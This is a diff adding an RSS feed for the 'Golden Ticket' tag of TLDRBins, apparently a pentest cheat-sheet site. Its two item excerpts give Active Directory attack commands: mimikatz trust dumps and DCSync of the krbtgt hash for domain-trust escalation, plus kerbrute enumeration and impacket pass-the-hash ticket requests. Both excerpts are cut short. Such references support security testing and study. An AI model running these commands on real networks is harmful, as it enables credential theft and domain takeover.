@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Golden Ticket on TLDRBins</title>
+    <link>https://tldrbins.github.io/@golden-ticket/</link>
+    <description>Recent content in Golden Ticket on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@golden-ticket/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Abuse Parent Child Domain Trusts</title>
+      <link>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</guid>
+      <description>Privesc from DA (Domain Admin) to EA (Enterprise Admin) 1. Check trust relationships # Get all trusted domain objects in a forest Get-ADTrust -Filter * # Returns a list of trusted domains nltest /domain_trusts # Gets a collection of the trust relationships of the current forest ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() 2. Get current and target domain SID ./mimikatz.exe &amp;#39;lsadump::trust&amp;#39; &amp;#39;exit&amp;#39; 3. Get krbtgt hash of current domain ./mimikatz.exe &amp;#39;lsadump::dcsync /all /csv&amp;#39; &amp;#39;exit&amp;#39; 4.</description>
+    </item>
+    <item>
+      <title>Kerberos</title>
+      <link>https://tldrbins.github.io/kerberos/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/kerberos/</guid>
+      <description>Kerbrute kerbrute&#xA;kerbrute userenum --domain &amp;lt;DOMAIN&amp;gt; --dc &amp;lt;DC&amp;gt; usernames.txt Usernames generator username-anarchy&#xA;./username-anarchy -i users.txt | tee usernames.txt Generate Kerberos Ticket (From Linux) Method #1: Using impacket sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getTGT -hashes :&amp;lt;HASH&amp;gt; &amp;lt;DOMAIN&amp;gt;/administrator export KRB5CCNAME=administrator.ccache # Check ticket klist Method #2 : Using kinit # Step 0: Installation sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to &amp;#39;/etc/hosts&amp;#39; (Try different order if not work) 10.</description>
+    </item>
+  </channel>
+</rss>
